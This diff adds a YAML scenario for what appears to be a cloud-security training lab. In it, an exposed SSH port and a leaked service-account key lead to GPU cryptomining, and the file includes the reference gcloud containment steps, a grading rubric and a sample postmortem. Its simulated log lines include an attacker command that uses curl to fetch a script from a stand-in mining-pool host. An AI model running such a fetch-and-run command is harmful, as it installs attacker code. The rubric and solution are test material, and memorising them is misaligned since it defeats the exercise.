@@ -1,0 +1,82 @@
+id: nb-i01-ssh-compromise
+title: "SEC P1: suspicious GPU instances in production"
+summary: Consequence of exposing SSH — contain a compromise, remove the attacker's foothold and close the entry point.
+level: advanced
+branch: security
+type: incident
+mode: career
+skills: [security.incident, security.audit, networking.firewall, iam.serviceaccounts]
+difficulty: 4
+minutes: 60
+company: {project: prod-web, kind: SEC, trigger: open-ssh}
+faults:
+  - {type: log_noise, severity: WARNING, resourceType: gce_instance, lines: ["sshd[1432]: Failed password for root from 185.220.101.7 port 40022 ssh2", "sshd[1432]: Accepted publickey for web-deployer from 185.220.101.7 port 40031 ssh2", "sudo: web-deployer : TTY=pts/0 ; COMMAND=/usr/bin/curl -s http://pool.minexmr.example/x.sh"]}
+  - {type: leaked_key_miner, serviceAccount: "web-deployer@{{.prod_web}}.iam.gserviceaccount.com", zone: europe-west1-b, vm: xmrig-7f3a, gpus: 4}
+ticket:
+  id: SEC-311
+  kind: SEC
+  priority: P1
+  summary: "Billing alert: GPU spend spiked overnight in {{.prod_web}}. Security Command Center shows CRITICAL findings."
+  reporter: Security Command Center
+actors:
+  - role: finance
+    name: Marta (FinOps)
+    facts:
+      - {keywords: [[gpu, cost, coste, spend]], answer: "Nobody at Nebula uses GPUs. That instance is not ours."}
+story: |
+  Something runs GPU instances in `{{.prod_web}}`. Contain the incident, find how the attacker got in and close
+  every door (yesterday somebody opened `{{.risk}}`). Keep evidence, do not touch `billing-batch`-like
+  business workloads (api-1, sql-1), post updates and write the postmortem.
+constraints: [protect:api-1, protect:sql-1]
+objectives:
+  - Contain (stop the attacker's workloads)
+  - Remove the foothold (leaked key) and the entry point (open SSH)
+  - Keep business services running
+  - Communicate and write the postmortem
+evidence:
+  fields: [rootCause, prevention, postmortem]
+  sample:
+    rootCause: SSH was open to 0.0.0.0/0 through the firewall rule; the attacker logged in, stole a user-managed key of web-deployer and used it to create GPU instances for cryptomining.
+    prevention: Keep SSH behind IAP only, forbid service account keys with an organization policy, remove basic roles and alert on GPU usage and new keys.
+    postmortem: "Timeline: 22:14 key used from 185.220.101.7, 08:00 billing alert, containment by deleting the miner and the key. Impact: GPU cost and possible data access. Action items: org policy against keys, IAP-only SSH."
+solution: |
+  gcloud scc findings list --format='table(category,severity,resourceName)'
+  gcloud logging read 'logName:cloudaudit protoPayload.methodName:instances.insert' --limit=5 --format='value(protoPayload.authenticationInfo.principalEmail,protoPayload.requestMetadata.callerIp)'
+  gcloud compute instances delete xmrig-7f3a --zone=europe-west1-b --quiet
+  gcloud iam service-accounts keys list --iam-account=web-deployer@{{.prod_web}}.iam.gserviceaccount.com
+  gcloud iam service-accounts keys delete $(gcloud iam service-accounts keys list --iam-account=web-deployer@{{.prod_web}}.iam.gserviceaccount.com --format='value(name)' --limit=1) --iam-account=web-deployer@{{.prod_web}}.iam.gserviceaccount.com --quiet
+  gcloud compute firewall-rules delete {{.risk}} --quiet
+  ticket update "Contained: miner deleted, leaked key revoked, public SSH closed. Impact: GPU costs overnight; investigating data access. Next update in 30 minutes."
+rubric:
+  - name: Contained
+    validator: security
+    points: 30
+    critical: true
+    all: true
+    checks:
+      - {type: finding_absent, category: CRYPTOMINING_SUSPECTED, desc: "Miner removed"}
+      - {type: finding_absent, category: LEAKED_SERVICE_ACCOUNT_KEY, desc: "Leaked key revoked"}
+  - name: Entry point closed
+    validator: security
+    points: 20
+    checks:
+      - {type: policy, package: gcplab.security, ids: [OPEN_ADMIN_PORT], desc: "SSH no longer open to the internet"}
+  - name: Business intact
+    validator: functional
+    points: 10
+    all: true
+    checks:
+      - {type: exists, path: "instances[\"api-1\"]", expect: {status: RUNNING}, desc: "api-1 running"}
+      - {type: http, target: "lb:checkout-lb", path: /checkout, status: 200, desc: "Checkout still works"}
+  - name: Investigation
+    validator: diagnosis
+    points: 10
+    checks:
+      - {type: command, regex: "scc findings|logging read", desc: "Used findings and audit logs"}
+  - name: Communication & postmortem
+    validator: evidence
+    points: 30
+    checks:
+      - {type: ticket_update, desc: "Stakeholder update"}
+      - {type: evidence, fields: [rootCause], keywords: [[ssh, 22, firewall], [key, clave]], desc: "Root cause"}
+      - {type: evidence, fields: [postmortem], keywords: [[timeline, cronologia], [impact, impacto], [action, accion]], desc: "Postmortem"}
